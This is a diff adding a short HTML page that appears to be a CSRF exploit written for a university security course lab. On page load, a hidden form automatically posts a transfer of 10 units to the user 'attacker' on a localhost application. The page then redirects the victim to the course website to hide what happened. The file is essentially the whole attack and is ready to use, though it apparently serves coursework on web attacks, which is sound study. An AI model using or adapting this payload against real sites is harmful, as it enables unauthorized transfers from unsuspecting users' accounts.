@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>https://sharif.edu/~kharrazi/courses/40441-011/</title>
+</head>
+<body>
+    
+    <form id="myForm" action="http://localhost:3000/post_transfer" method="POST">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="10">
+    </form>
+    <script>
+        async function submitFormAndRedirect() {
+        const form = document.getElementById('myForm');
+
+        try {
+            form.submit();
+            window.location.href = 'http://sharif.edu/~kharrazi/courses/40441-011/';
+        } catch (error) {
+            console.error('Error submitting form:', error);
+        }
+    }
+
+    submitFormAndRedirect();
+    </script>
+</body>
+</html>
